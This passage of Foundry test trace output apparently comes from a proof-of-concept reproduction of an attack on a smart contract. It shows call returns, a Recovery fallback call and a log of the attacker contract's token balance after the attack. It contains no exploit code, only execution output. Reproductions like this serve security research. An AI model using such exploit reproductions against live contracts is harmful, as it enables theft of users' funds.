    │   │   │   └─ ← [Return] 13041098705767818172 [1.304e19]

    │   │   │   ├─ [83] Recovery::fallback{value: 13041098705767818172}()
    │   │   │   │   └─ ← [Stop]

    │   │   │   ├─  storage changes:

    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 13139470651667818172 [1.313e19], decimals: 18)
    ├─ [1070] 0x7570FDAd10010A06712cae03D2fC2B3A53640aa4::balanceOf(AttackerC: [0x9b78b5d9feBCE2B8868Ea6EE2822cb482a85AD74]) [staticcall]
